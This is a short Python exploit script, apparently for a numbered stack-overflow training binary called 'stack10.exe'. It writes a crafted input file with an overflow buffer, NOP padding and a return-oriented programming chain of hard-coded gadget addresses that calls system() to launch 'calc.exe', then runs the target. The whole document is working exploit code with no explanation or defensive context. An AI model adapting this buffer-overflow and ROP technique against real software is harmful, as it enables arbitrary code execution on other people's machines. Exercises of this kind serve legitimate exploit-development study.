import subprocess, struct, win32api


size = "\xff"
DstBuf =  "calc.exe" + "\x00" +  "\x90"*(52-9)
s = 'B' * 4

r1  = struct.pack('<L', 0x10101273) # pop ecx;
r1 += struct.pack('<L', 0x1010208c) # system import
r1 += struct.pack('<L', 0x101015bc) # mov eax, ecx
r1 += struct.pack('<L',	0x101015be) # ret
r1 += struct.pack('<L', 0x101015be) # ret
r1 += "\x31\x8a"

f = open('fichero.dat', 'wb')
f.write(size + DstBuf + s + r1)
f.close()

subprocess.Popen('stack10.exe')
